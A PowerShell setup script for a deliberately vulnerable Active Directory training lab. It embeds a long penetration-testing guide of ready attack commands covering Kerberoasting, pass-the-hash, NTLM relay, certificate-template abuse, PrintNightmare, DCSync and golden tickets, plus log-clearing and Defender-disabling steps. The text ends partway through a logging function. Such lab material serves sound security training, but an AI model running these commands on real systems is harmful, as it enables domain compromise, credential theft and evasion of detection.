<#
.SYNOPSIS
    Active Directory Lab Environment Setup with Intended Vulnerabilities for Security Training

.DESCRIPTION
    This script automates the creation of an intentionally vulnerable Active Directory environment
    designed for security training, penetration testing, and red team exercises. It configures
    various security weaknesses commonly found in enterprise environments.

    WARNING: This script creates an intentionally insecure environment.
    DO NOT use in production or on any network connected to the internet.

.PARAMETER DomainName
    Specifies the DNS name of the domain (default: lab.local)

.PARAMETER DomainNetbiosName
    Specifies the NetBIOS name of the domain (default: LAB)

.PARAMETER DomainAdminPassword
    Specifies the password for the built-in Administrator account (default: P@ssw0rd123)

.PARAMETER IPAddress
    Specifies the static IP address for the domain controller (default: 172.16.70.10)

.PARAMETER PrefixLength
    Specifies the subnet prefix length (default: 24)

.PARAMETER DefaultGateway
    Specifies the default gateway (default: 172.16.70.1)

.EXAMPLE
    # Default configuration
    .\Hacklab-AD3.ps1

.EXAMPLE
    # Custom domain and IP configuration
    .\Hacklab-AD3.ps1 -DomainName "test.lab" -DomainNetbiosName "TEST" -IPAddress "192.168.1.10"

.NOTES
    File Name      : Hacklab-AD3.ps1
    Author         : Amit Agarwal
    Last Modified  : 2025-06-30
    Version        : 2.1
    Purpose        : Create a vulnerable AD lab environment for security training
#>


[CmdletBinding()]
param (
  [string]$DomainName = "lab.local",
  [string]$DomainNetbiosName = "LAB",
  [System.Security.SecureString]$DomainAdminPassword = (ConvertTo-SecureString -String "P@ssw0rd123" -AsPlainText -Force),
  [string]$IPAddress = "172.16.70.10",
  [int]$PrefixLength = 24,
  [string]$DefaultGateway = "172.16.70.1",
  [switch]$HelpPT,
  [int]$UserCount = 50
)

# Set DNS servers based on IP address (DC IP + Google DNS fallback)
$DNSServers = @($IPAddress, "8.8.8.8")
Write-Host "DNS servers set to: $($DNSServers -join ', ')" -ForegroundColor Green

## Enable for tracing.
Set-PSDebug -Trace 0

# Suppress verbose output from modules and cmdlets to keep logs clean
$VerbosePreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'

# Suppress verbose output from specific cmdlets
$PSDefaultParameterValues = @{
  'Enable-PSRemoting:Verbose'          = $false
  'Install-WindowsFeature:Verbose'     = $false
  'Get-WindowsFeature:Verbose'         = $false
  'Import-Module:Verbose'              = $false
  'Set-PSSessionConfiguration:Verbose' = $false
  'Get-PSSessionConfiguration:Verbose' = $false
  'New-ADUser:Verbose'                 = $false
  'Set-ADUser:Verbose'                 = $false
  'Add-ADGroupMember:Verbose'          = $false
  'Get-ADOrganizationalUnit:Verbose'   = $false
}

# Display penetration testing help if requested
if ($HelpPT) {
  Write-Host @"

# Active Directory Lab - Penetration Testing Guide
# =============================================

## Initial Enumeration

### Windows (PowerShell):
`$domain = "`$(`$Script:DomainConfig.DomainName)"
`$domainSID = (Get-ADDomain).DomainSID.Value
Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,Description,MemberOf,LastLogonDate
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem,LastLogonDate
Get-ADGroup -Filter * | Select-Object Name,Description,Members

### Linux (Comprehensive Enumeration):

## USER ENUMERATION METHODS (Windows Server 2025+ Compatible)

### Method 1: Kerbrute User Enumeration (No Authentication Required)
# Most reliable method for modern Windows - uses Kerberos pre-auth failures
kerbrute userenum -d `$(`$Script:DomainConfig.DomainName) --dc `$(`$Script:NetworkConfig.IPAddress) /usr/share/seclists/Usernames/Names/names.txt
kerbrute userenum -d `$(`$Script:DomainConfig.DomainName) --dc `$(`$Script:NetworkConfig.IPAddress) /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt

### Method 2: LDAP Anonymous Bind (If Enabled)
ldapsearch -x -H ldap://`$(`$Script:NetworkConfig.IPAddress) -s base namingcontexts
ldapsearch -x -H ldap://`$(`$Script:NetworkConfig.IPAddress) -b "DC=lab,DC=local" "(objectClass=user)" sAMAccountName description
ldapsearch -x -H ldap://`$(`$Script:NetworkConfig.IPAddress) -b "DC=lab,DC=local" "(objectClass=computer)" dNSHostName

### Method 3: Guest Account Enumeration (If Enabled)
# Try with guest account (often enabled in labs)
windapsearch.py -d `$(`$Script:DomainConfig.DomainName) --dc-ip `$(`$Script:NetworkConfig.IPAddress) -u guest -p "" --users
rpcclient -U "guest%" `$(`$Script:NetworkConfig.IPAddress) -c "enumdomusers"
lookupsid.py `$(`$Script:DomainConfig.DomainName)/guest@`$(`$Script:NetworkConfig.IPAddress)

### Method 4: SMB Null Session (Legacy)
# Try null sessions (may work on older systems or misconfigurations)
enum4linux-ng -A `$(`$Script:NetworkConfig.IPAddress)
smbclient -L //`$(`$Script:NetworkConfig.IPAddress) -N
rpcclient -U "" -N `$(`$Script:NetworkConfig.IPAddress) -c "enumdomusers"
samrdump.py -no-pass `$(`$Script:NetworkConfig.IPAddress)

### Method 5: RID Cycling (If SMB Access Available)
# Enumerate users by cycling through RIDs
lookupsid.py -no-pass `$(`$Script:DomainConfig.DomainName)/guest@`$(`$Script:NetworkConfig.IPAddress) 500-2000

### Method 6: DNS Enumeration for Hostnames
# Enumerate computer accounts via DNS
dnsrecon -d `$(`$Script:DomainConfig.DomainName) -n `$(`$Script:NetworkConfig.IPAddress) -a
dnsrecon -d `$(`$Script:DomainConfig.DomainName) -n `$(`$Script:NetworkConfig.IPAddress) -t brt -D /usr/share/dnsrecon/namelist.txt

### Method 7: Web Application User Disclosure
# Check vulnerable web applications for user information
curl -s "http://`$(`$Script:NetworkConfig.IPAddress)/vulnapp/users.txt" 2>/dev/null
wget -q -O - "http://`$(`$Script:NetworkConfig.IPAddress)/VulnerableShare/usernames_wordlist.txt" 2>/dev/null

### Method 8: SNMP Enumeration (If Enabled)
# Check for SNMP user enumeration
snmpwalk -c public -v1 `$(`$Script:NetworkConfig.IPAddress) 1.3.6.1.4.1.77.1.2.25
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt `$(`$Script:NetworkConfig.IPAddress)

## Common Attack Vectors

### 1. AS-REP Roasting (No Pre-auth required users)
#### Windows (Rubeus):
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

#### Linux (Impacket):
GetNPUsers.py -dc-ip `$(`$Script:NetworkConfig.IPAddress) -request -outputfile hashes.txt `$(`$Script:DomainConfig.DomainName)/

### 2. Kerberoasting
#### Windows (Rubeus):
Rubeus.exe kerberoast /outfile:kerberoast.txt

#### Linux (Impacket):
GetUserSPNs.py -dc-ip `$(`$Script:NetworkConfig.IPAddress) `$(`$Script:DomainConfig.DomainName)/

### 3. SMB Relay
#### Linux (Impacket):
ntlmrelayx.py -tf targets.txt -smb2support

### 4. Pass the Hash
#### Windows (Mimikatz):
sekurlsa::pth /user:Administrator /domain:`$(`$Script:DomainConfig.DomainName) /ntlm:HASH /run:cmd.exe

#### Linux (Impacket):
psexec.py -hashes :HASH `$(`$Script:DomainConfig.DomainName)/Administrator@`$(`$Script:NetworkConfig.IPAddress)

### 5. AD CS Attacks (ESC1-ESC8)
#### ESC1 (Vulnerable Template):
certipy req -u user@`$(`$Script:DomainConfig.DomainName) -p 'Password123' -target `$(`$Script:NetworkConfig.IPAddress) -ca '`$(`$Script:DomainConfig.DomainNetbiosName)-ROOT-CA' -template 'VulnerableUserESC1' -upn 'administrator@`$(`$Script:DomainConfig.DomainName)' -dns `$(`$Script:DomainConfig.DCName).`$(`$Script:DomainConfig.DomainName)

### 6. LLMNR/NBT-NS Poisoning
#### Linux (Responder):
responder -I eth0 -rdwv
responder -I eth0 -A -f

#### Windows (Inveigh):
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788

#### Linux (Inveigh.py):
inveigh.py -i eth0

### 7. PrintNightmare (CVE-2021-1675)
#### Windows - Check if vulnerable:
Get-Service -Name Spooler

#### Windows (SharpPrintNightmare):
SharpPrintNightmare.exe C:\Windows\System32\kernelbase.dll

#### Linux (Impacket):
rpcdump.py `$(`$Script:NetworkConfig.IPAddress) | grep -i spooler
cve-2021-1675.py `$(`$Script:DomainConfig.DomainName)/user:password@`$(`$Script:NetworkConfig.IPAddress) '\\\\`$(`$Script:NetworkConfig.IPAddress)\\share\\evil.dll'

### 8. Shadow Credentials
#### Windows (Whisker):
Whisker.exe add /target:VULN-PC01$ /domain:`$(`$Script:DomainConfig.DomainName) /dc:`$(`$Script:NetworkConfig.IPAddress)
Whisker.exe list /target:VULN-PC01$ /domain:`$(`$Script:DomainConfig.DomainName) /dc:`$(`$Script:NetworkConfig.IPAddress)

#### Linux (pywhisker):
pywhisker.py -d `$(`$Script:DomainConfig.DomainName) -u user -p password --target "VULN-PC01$" --action add
pywhisker.py -d `$(`$Script:DomainConfig.DomainName) -u user -p password --target "VULN-PC01$" --action list

### 9. Resource-Based Constrained Delegation (RBCD)
#### Windows (PowerMad + Rubeus):
New-MachineAccount -MachineAccount FAKE01 -Password `$(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
Set-ADComputer VULN-PC01 -PrincipalsAllowedToDelegateToAccount FAKE01$
Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/VULN-PC01.`$(`$Script:DomainConfig.DomainName) /ptt

#### Linux (Impacket):
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Password123!' `$(`$Script:DomainConfig.DomainName)/user:password
rbcd.py -delegate-from 'FAKE01$' -delegate-to 'VULN-PC01$' -action write `$(`$Script:DomainConfig.DomainName)/user:password
getST.py -spn cifs/VULN-PC01.`$(`$Script:DomainConfig.DomainName) -impersonate Administrator `$(`$Script:DomainConfig.DomainName)/FAKE01$:Password123!

### 10. DNS Admin Group Privilege Escalation
#### Windows (PowerShell):
# Load malicious DLL via DNS service
dnscmd.exe /config /serverlevelplugindll C:\VulnerableShare\evil.dll
sc.exe stop dns
sc.exe start dns

#### Linux:
# Use DNS Admin credentials to load DLL
smbclient.py `$(`$Script:DomainConfig.DomainName)/dns.admin:dns@`$(`$Script:NetworkConfig.IPAddress)

### 11. Machine Account Quota Exploitation
#### Windows (PowerMad):
New-MachineAccount -MachineAccount EVILPC01 -Password `$(ConvertTo-SecureString 'EvilPass123!' -AsPlainText -Force)

#### Linux (Impacket):
addcomputer.py -computer-name 'EVILPC01$' -computer-pass 'EvilPass123!' `$(`$Script:DomainConfig.DomainName)/user:password

### 12. Backup Operators Privilege Escalation
#### Windows:
# Use SeBackupPrivilege to dump SAM/SYSTEM
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv

#### Linux:
# Use backup.operator credentials
smbclient.py `$(`$Script:DomainConfig.DomainName)/backup.operator:backup@`$(`$Script:NetworkConfig.IPAddress)

### 13. Account Operators Group Misuse
#### Windows:
# Create new users and add to privileged groups
net user newadmin Password123! /add /domain
net group "Domain Admins" newadmin /add /domain

#### Linux:
# Use account.operator credentials
smbclient.py `$(`$Script:DomainConfig.DomainName)/account.operator:account@`$(`$Script:NetworkConfig.IPAddress)

### 14. ADIDNS Wildcard Record Poisoning
#### Windows (PowerShell):
# Create wildcard DNS records
Add-DnsServerResourceRecordA -Name "*" -ZoneName `$(`$Script:DomainConfig.DomainName) -IPv4Address "192.168.1.100"

#### Linux (Impacket):
# Use dnstool.py to create malicious records
dnstool.py -u `$(`$Script:DomainConfig.DomainName)\user -p password -r "*.`$(`$Script:DomainConfig.DomainName)" -d 192.168.1.100 --action add `$(`$Script:NetworkConfig.IPAddress)

### 15. SYSVOL/NETLOGON Sensitive File Exposure
#### Windows:
# Search for sensitive files in SYSVOL
dir \\`$(`$Script:DomainConfig.DomainName)\SYSVOL\`$(`$Script:DomainConfig.DomainName)\scripts /s
findstr /s /i password \\`$(`$Script:DomainConfig.DomainName)\SYSVOL\*.xml
findstr /s /i password \\`$(`$Script:DomainConfig.DomainName)\SYSVOL\*.bat

#### Linux:
# Mount SYSVOL and search for credentials
smbclient //`$(`$Script:NetworkConfig.IPAddress)/SYSVOL -U `$(`$Script:DomainConfig.DomainName)/user%password
grep -r -i "password" /mnt/sysvol/

### 16. GPP Password Disclosure (cpassword)
#### Windows:
# Decrypt GPP passwords
Get-GPPPassword
findstr /s /i cpassword \\`$(`$Script:DomainConfig.DomainName)\SYSVOL\*.xml

#### Linux:
# Use gpp-decrypt to decode cpassword
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

### 17. Advanced Certificate Vulnerabilities (ESC8-ESC10)
#### ESC8 - NTLM Relay to AD CS HTTP:
ntlmrelayx.py -t http://`$(`$Script:NetworkConfig.IPAddress)/certsrv/certfnsh.asp -smb2support --adcs

#### ESC9 - No Security Extension:
certipy req -u user@`$(`$Script:DomainConfig.DomainName) -p password -target `$(`$Script:NetworkConfig.IPAddress) -template VulnerableUserESC9

#### ESC10 - Weak Certificate Mappings:
certipy shadow -u user@`$(`$Script:DomainConfig.DomainName) -p password -target `$(`$Script:NetworkConfig.IPAddress)

### 10. Constrained Delegation
#### Windows - Find accounts:
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "`$null"} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "`$null"} -Properties msDS-AllowedToDelegateTo

#### Windows (Rubeus):
Rubeus.exe s4u /user:constrained_svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc.lab.local /ptt

#### Linux (Impacket):
findDelegation.py `$(`$Script:DomainConfig.DomainName)/user:password -dc-ip `$(`$Script:NetworkConfig.IPAddress)
getST.py -spn cifs/dc.lab.local -impersonate Administrator `$(`$Script:DomainConfig.DomainName)/constrained_svc:Constrained123!

## Privilege Escalation Paths

1. Domain User -> Local Admin (via weak service permissions)
2. Local Admin -> Domain Admin (via unconstrained delegation)
3. Domain User -> Domain Admin (via vulnerable GPOs)
4. Service Account -> Domain Admin (via kerberoasting)
5. Workstation Admin -> Domain Admin (via lateral movement)
6. Domain User -> Domain Admin (via DCSync rights on admin.backup)
7. Domain User -> System (via PrintNightmare)
8. Domain User -> Domain Admin (via Shadow Credentials)
9. Domain User -> Domain Admin (via RBCD on VULN-PC01)
10. Domain User -> Domain Admin (via constrained delegation)
11. Domain User -> Privileged Access (via DNS Admins group)
12. Domain User -> Local Admin (via LAPS password disclosure)
13. Domain User -> Computer Account Creation (via Machine Account Quota)
14. Domain User -> System (via Backup Operators SeBackupPrivilege)
15. Domain User -> User/Group Management (via Account Operators)
16. Anonymous -> Domain Enumeration (via Pre-Windows 2000 Compatible Access)
17. Domain User -> Traffic Interception (via ADIDNS wildcard poisoning)
18. Domain User -> Credential Disclosure (via SYSVOL/GPP passwords)
19. Domain User -> NTLM Relay (via ESC8 certificate HTTP endpoints)
20. Domain User -> Certificate Abuse (via ESC9/ESC10 weak mappings)

## Post-Exploitation

### Dump all hashes
#### Windows (Mimikatz):
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets

#### Linux (Impacket):
secretsdump.py `$(`$Script:DomainConfig.DomainName)/Administrator@`$(`$Script:NetworkConfig.IPAddress)
secretsdump.py -hashes :HASH `$(`$Script:DomainConfig.DomainName)/Administrator@`$(`$Script:NetworkConfig.IPAddress)

### Golden Ticket
#### Windows (Mimikatz):
kerberos::golden /user:Administrator /domain:`$(`$Script:DomainConfig.DomainName) /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt

#### Linux (Impacket):
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass `$(`$Script:DomainConfig.DomainName)/Administrator@`$(`$Script:DomainConfig.DCName)

### DCSync Attack
#### Windows (Mimikatz):
lsadump::dcsync /domain:`$(`$Script:DomainConfig.DomainName) /all
lsadump::dcsync /domain:`$(`$Script:DomainConfig.DomainName) /user:krbtgt

#### Linux (Impacket):
secretsdump.py -just-dc `$(`$Script:DomainConfig.DomainName)/admin.backup@`$(`$Script:NetworkConfig.IPAddress)
secretsdump.py -just-dc-user krbtgt `$(`$Script:DomainConfig.DomainName)/admin.backup@`$(`$Script:NetworkConfig.IPAddress)

## Useful Files
- C:\VulnerableShare\usernames_wordlist.txt - Username wordlist for brute-forcing
- C:\VulnerableShare\password_policy.txt - Password policy information
- C:\inetpub\wwwroot\vulnerable_app - Web application with potential RCE

## Additional Attack Vectors

### 11. GPO Abuse
#### Windows (PowerShell):
Get-GPO -All | Where-Object { (Get-GPPermission -Guid `$_.Id -All).Trustee.Name -match 'Authenticated Users' }

#### Linux (Impacket):
findDelegation.py `$(`$Script:DomainConfig.DomainName)/user:password -dc-ip `$(`$Script:NetworkConfig.IPAddress)

### 12. Unconstrained Delegation
#### Windows (PowerShell):
Get-ADComputer -Filter {TrustedForDelegation -eq `$true} -Properties *
Get-ADUser -Filter {TrustedForDelegation -eq `$true} -Properties *

#### Linux (Impacket):
findDelegation.py `$(`$Script:DomainConfig.DomainName)/user:password -dc-ip `$(`$Script:NetworkConfig.IPAddress)

### 13. SMB Relay Attacks
#### Linux (Impacket):
ntlmrelayx.py -tf targets.txt -smb2support -socks
ntlmrelayx.py -t ldap://`$(`$Script:NetworkConfig.IPAddress) --escalate-user lowpriv
ntlmrelayx.py -t ldaps://`$(`$Script:NetworkConfig.IPAddress) --add-computer

### 14. LDAP Enumeration
#### Linux (ldapsearch):
ldapsearch -x -H ldap://`$(`$Script:NetworkConfig.IPAddress) -D "" -w "" -b "DC=lab,DC=local"
ldapsearch -x -H ldap://`$(`$Script:NetworkConfig.IPAddress) -D "guest" -w "" -b "DC=lab,DC=local" "(objectClass=user)"

#### Linux (windapsearch):
windapsearch.py -d `$(`$Script:DomainConfig.DomainName) --dc-ip `$(`$Script:NetworkConfig.IPAddress) -u "" --functionality
windapsearch.py -d `$(`$Script:DomainConfig.DomainName) --dc-ip `$(`$Script:NetworkConfig.IPAddress) -u guest -p "" --users

### 15. Password Spraying
#### Linux (kerbrute):
kerbrute passwordspray -d `$(`$Script:DomainConfig.DomainName) --dc `$(`$Script:NetworkConfig.IPAddress) users.txt Password123

#### Linux (crackmapexec):
crackmapexec smb `$(`$Script:NetworkConfig.IPAddress) -u users.txt -p passwords.txt --continue-on-success
crackmapexec ldap `$(`$Script:NetworkConfig.IPAddress) -u users.txt -p Password123

### 16. BloodHound Data Collection
#### Windows (SharpHound):
SharpHound.exe -c All -d `$(`$Script:DomainConfig.DomainName) --zipfilename bloodhound.zip

#### Linux (bloodhound-python):
bloodhound-python -d `$(`$Script:DomainConfig.DomainName) -u guest -p "" -gc `$(`$Script:DomainConfig.DCName) -c all

### 17. DNS Enumeration
#### Linux (dnsrecon):
dnsrecon -d `$(`$Script:DomainConfig.DomainName) -n `$(`$Script:NetworkConfig.IPAddress) -a
dnsrecon -d `$(`$Script:DomainConfig.DomainName) -n `$(`$Script:NetworkConfig.IPAddress) -t axfr

### 18. SMB Enumeration
#### Linux (smbclient):
smbclient -L //`$(`$Script:NetworkConfig.IPAddress) -N
smbclient //`$(`$Script:NetworkConfig.IPAddress)/SYSVOL -N

#### Linux (enum4linux):
enum4linux -a `$(`$Script:NetworkConfig.IPAddress)
enum4linux-ng -A `$(`$Script:NetworkConfig.IPAddress)

## Defensive Evasion
- Clear event logs: wevtutil cl security
- Disable Windows Defender: Set-MpPreference -DisableRealtimeMonitoring `$true

## Useful Tools

### Windows Tools
- **PowerSploit**: Various AD exploitation modules
- **BloodHound**: AD attack path visualization
- **Mimikatz**: Credential dumping and attacks
- **Rubeus**: Kerberos exploitation
- **Certify**: AD CS exploitation
- **SharpHound**: AD data collection for BloodHound
- **Whisker**: Shadow Credentials attacks
- **PowerMad**: Machine account manipulation
- **SharpPrintNightmare**: PrintNightmare exploitation
- **Inveigh**: LLMNR/NBT-NS poisoning
- **PowerView**: AD enumeration and exploitation
- **ADSearch**: Lightweight AD enumeration

### Linux Tools
- **Impacket Suite**: Comprehensive AD protocol attacks
  - secretsdump.py, GetUserSPNs.py, GetNPUsers.py
  - psexec.py, wmiexec.py, dcomexec.py
  - ntlmrelayx.py, addcomputer.py, rbcd.py
- **Responder**: LLMNR/NBT-NS poisoning
- **CrackMapExec**: Network service enumeration and exploitation
- **BloodHound.py**: Python BloodHound data collector
- **Kerbrute**: Kerberos username enumeration and password spraying
- **ldapsearch**: LDAP enumeration
- **enum4linux/enum4linux-ng**: SMB/NetBIOS enumeration
- **smbclient**: SMB client for file access
- **rpcclient**: RPC enumeration
- **Certipy**: AD CS attacks from Linux
- **pywhisker**: Shadow Credentials from Linux
- **windapsearch**: LDAP enumeration tool
- **dnsrecon**: DNS enumeration and zone transfers
- **CVE-2021-1675.py**: PrintNightmare exploitation

## Post-Exploitation Checklist
1. Dump credentials from memory (Mimikatz)
2. Check for sensitive files (config files, scripts, etc.)
3. Look for stored credentials (cmdkey, Credential Manager)
4. Check for saved RDP connections
5. Look for unattended installation files
6. Check for scheduled tasks with credentials
7. Look for web.config files with connection strings
8. Check for PuTTY saved sessions
9. Look for browser saved credentials
10. Check for saved VPN credentials

## Cleanup Commands
- Clear PowerShell history: Clear-History
- Clear Windows Event Logs: wevtutil cl System; wevtutil cl Security; wevtutil cl Application
- Clear RDP logs: wevtutil cl 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
- Clear PowerShell logs: wevtutil cl 'Microsoft-Windows-PowerShell/Operational'

## Additional Attack Vectors

### 1. GPO Abuse (ESC4)
#### Enumerate vulnerable GPOs:
```powershell
Get-GPO -All | Where-Object { (Get-GPPermission -Guid `$_.Id -All).Trustee.Name -match 'Authenticated Users' }
```

#### Exploit GPO with PowerView:
```powershell
`$gpoGuid = (Get-GPO -Name 'Vulnerable-GPO').Id
Get-ObjectAcl -ResolveGUIDs -Name `$gpoGuid | Format-Table -AutoSize
```

### 2. Unconstrained Delegation
#### Find computers with unconstrained delegation:
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq `$true} -Properties *
```

#### Extract tickets from memory (Mimikatz):
```
sekurlsa::tickets /export
```

### 3. Scheduled Task Exploitation
#### List vulnerable scheduled tasks:
```powershell
Get-ScheduledTask | Where-Object { `$_.Principal.RunLevel -eq "Highest" }
```

### 4. Weak Service Permissions
#### Find vulnerable services:
```powershell
Get-Service | Where-Object {
    `$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\`$(`$_.Name)"
    `$acl.Access | Where-Object {
        `$_.IdentityReference -match 'BUILTIN\\Users' -and
        `$_.FileSystemRights -match 'FullControl|Modify|Write'
    }
}
```

### 5. Print Spooler (PrintNightmare)
#### Check if vulnerable:
```powershell
Get-Service -Name Spooler
```

### 6. DNS Zone Transfers
#### Check for zone transfer vulnerability:
```powershell
nslookup -type=any -query=AXFR `$(`$Script:DomainConfig.DomainName) `$(`$Script:NetworkConfig.IPAddress)
```

### 7. WSUS Exploitation
#### Check WSUS configuration:
```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
```

### 8. Shadow Credentials
#### Check for vulnerable computer objects:
```powershell
Get-ADComputer -Filter * | Get-Acl | Where-Object {
    `$_.Access | Where-Object {
        `$_.IdentityReference -match 'Authenticated Users' -and
        `$_.ActiveDirectoryRights -match 'WriteDacl|GenericAll|WriteProperty|WriteOwner'
    }
}
```

### 9. Backup Operators Privilege Escalation
#### Dump SAM/SYSTEM hives:
```powershell
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv
```

### 10. LAPS Bypass
#### Check if LAPS is installed:
```powershell
gpresult /r | findstr /i "LAPS"
```

#### Dump LAPS passwords (PowerShell):
```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime |
    Where-Object { `$_.'ms-Mcs-AdmPwd' -ne `$null } |
    Select-Object Name, ms-Mcs-AdmPwd, @{n="PwdExpires";e={[datetime]::FromFileTime(`$_.'ms-Mcs-AdmPwdExpirationTime')}}
```

## Useful Tools

 **PowerSploit**: Various AD exploitation modules
- **BloodHound**: AD attack path visualization
- **Mimikatz**: Credential dumping and attacks
- **Impacket**: Network protocol attacks
- **Rubeus**: Kerberos exploitation
- **Certify**: AD CS exploitation
- **SharpHound**: AD data collection for BloodHound

## Post-Exploitation Checklist
1. Dump credentials from memory (Mimikatz)
2. Check for sensitive files (config files, scripts, etc.)
3. Look for stored credentials (cmdkey, Credential Manager)
4. Check for saved RDP connections (Saved RDP credentials)
5. Look for unattended installation files
6. Check for scheduled tasks with credentials
7. Look for web.config files with connection strings
8. Check for PuTTY saved sessions
9. Look for browser saved credentials
10. Check for saved VPN credentials

## Cleanup Commands
- Clear PowerShell history: Clear-History
- Clear Windows Event Logs: wevtutil cl System; wevtutil cl Security; wevtutil cl Application
- Clear RDP logs: wevtutil cl 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
- Clear PowerShell logs: wevtutil cl 'Microsoft-Windows-PowerShell/Operational'
"@
  exit
}

#Requires -RunAsAdministrator
#Requires -Version 5.1

#region Initialization

<#
.SYNOPSIS
    Initializes script configuration and parameters.
.DESCRIPTION
    This script region sets up the initial configuration including error handling,
    logging, and parameter validation for the AD lab environment setup.
#>

# Set Error Action Preference
$ErrorActionPreference = 'Stop'
$WarningPreference = 'Continue'
$VerbosePreference = 'Continue'

# Create separate transcript and log files
$transcriptFile = Join-Path -Path $PSScriptRoot -ChildPath "ADLab_Transcript_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$logFile = Join-Path -Path $PSScriptRoot -ChildPath "ADLab_Log_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

# Start transcript to capture all PowerShell activity
Start-Transcript -Path $transcriptFile -Append -Force

# Set global log file variable for Write-Log function
$Global:ADLabLogFile = $logFile

# Initial logging setup message
Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] AD Lab Setup Script Started" -ForegroundColor Green
Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] Transcript File: $transcriptFile" -ForegroundColor Cyan
Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] Log File: $logFile" -ForegroundColor Cyan
Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] All PowerShell commands and output will be captured in the transcript file" -ForegroundColor Yellow
Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] Structured logs will be written to the log file" -ForegroundColor Yellow

# Enable PowerShell Script Block Logging for detailed command capture
try {
  Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] Enabling PowerShell Script Block Logging..." -ForegroundColor Cyan

  # Create registry path for PowerShell logging
  $psLoggingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
  if (-not (Test-Path $psLoggingPath)) {
    New-Item -Path $psLoggingPath -Force | Out-Null
  }

  # Enable script block logging
  Set-ItemProperty -Path $psLoggingPath -Name "EnableScriptBlockLogging" -Value 1 -Type DWord -Force

  # Also enable invocation logging for more detailed capture
  Set-ItemProperty -Path $psLoggingPath -Name "EnableScriptBlockInvocationLogging" -Value 1 -Type DWord -Force

  Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [SUCCESS] PowerShell Script Block Logging enabled" -ForegroundColor Green
  Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] Detailed command logs will be available in Windows Event Log" -ForegroundColor Yellow
  Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] Event Log Location: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational" -ForegroundColor Yellow
  Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] Event IDs: 4104 (Script Block), 4105 (Script Block Start), 4106 (Script Block End)" -ForegroundColor Yellow
}
catch {
  Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [WARNING] Could not enable PowerShell Script Block Logging: $_" -ForegroundColor Yellow
  Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [INFO] Script will continue with standard transcript logging only" -ForegroundColor Yellow
}

# Function to write formatted log messages
function Write-Log {
  [CmdletBinding()]
  param (
    [Parameter(Mandatory = $true)]
    [string]$Message,

    [Parameter(Mandatory = $false)]
    [ValidateSet('INFO', 'WARNING', 'ERROR', 'SUCCESS', 'DEBUG')]
    [string]$Level = 'INFO',

    [Parameter(Mandatory = $false)]
    [string]$LogPath = $Global:ADLabLogFile
  )

  # Use global log file if LogPath is not specified
  if (-not $LogPath -and $Global:ADLabLogFile) {
    $LogPath = $Global:ADLabLogFile
  }
  elseif (-not $LogPath) {
    $LogPath = Join-Path -Path $PSScriptRoot -ChildPath "ADLab_Log_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
  }

  # Create log directory if it doesn't exist
  $logDir = Split-Path -Path $LogPath -Parent
  if (-not (Test-Path -Path $logDir)) {
    try {
      New-Item -Path $logDir -ItemType Directory -Force | Out-Null
    }
    catch {
      Write-Error "Failed to create log directory '$logDir': $_"
      return
    }
  }

  $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
  $logMessage = "[$timestamp] [$Level] $Message"

  # Write to console with appropriate colors and also ensure it goes to transcript
  switch ($Level) {
    'ERROR' {
      Write-Host $logMessage -ForegroundColor Red
      Write-Error $logMessage -ErrorAction Continue
    }
    'WARNING' {
      Write-Host $logMessage -ForegroundColor Yellow
      Write-Warning $logMessage
    }
    'SUCCESS' {
